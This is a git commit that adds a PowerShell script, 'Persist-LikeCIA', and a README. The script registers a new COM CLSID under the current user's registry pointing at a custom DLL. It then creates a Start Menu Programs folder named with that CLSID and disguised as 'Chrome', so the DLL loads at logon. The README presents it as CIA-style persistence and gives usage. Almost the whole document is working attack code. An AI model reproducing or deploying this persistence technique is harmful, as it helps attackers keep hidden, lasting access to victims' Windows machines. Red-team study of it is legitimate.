c9f10932685b68f3a267c45ae9fb8c5a887acb39
bashexplode <bashexplode@gmail.com>
2017-07-20 18:21:03 -0700

    first commit

---
+++ Persist-LikeCIA.ps1
@@ -0,0 +1,22 @@
+﻿function Persist-LikeCIA{
+[CmdletBinding()]
+Param(
+        [String]
+        $DLLpath = "C:\Windows\Temp\clsid.dll",
+
+        [String]
+        $COMName = "CONTOSO_COM",
+
+        [String]
+        $FolderName = "Chrome"
+
+)
+    $guid = [guid]::NewGuid()
+    $guid = ($guid.ToString()).ToUpper()
+
+    cmd.exe /c reg add "HKCU\Software\Classes\CLSID\{$guid}" /t REG_SZ /d "$COMName" | Out-Null
+    cmd.exe /c reg add "HKCU\Software\Classes\CLSID\{$guid}\InProcServer32" /t REG_SZ /d "$DLLpath" | Out-Null
+    cmd.exe /c reg add "HKCU\Software\Classes\CLSID\{$guid}\InProcServer32" /v ThreadingModel /t REG_SZ /d "Apartment" | Out-Null
+    mkdir "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\$FolderName.{$guid}" | Out-Null
+
+}
---
+++ README.md
@@ -0,0 +1,7 @@
+# Coded by Jesse Nebling (@bashexplode)
+
+#### Description:
+PowerShell script that creates persistence like that of the CIA. Requires a custom DLL. Inspired by: https://wikileaks.org/ciav7p1/cms/page_13763373.html
+
+#### Usage:
+Persist-LikeCIA -DLLPath "C:\Windows\Temp\clsid.dll" -COMName "CONTOSO_COM" -FolderName "Chrome"
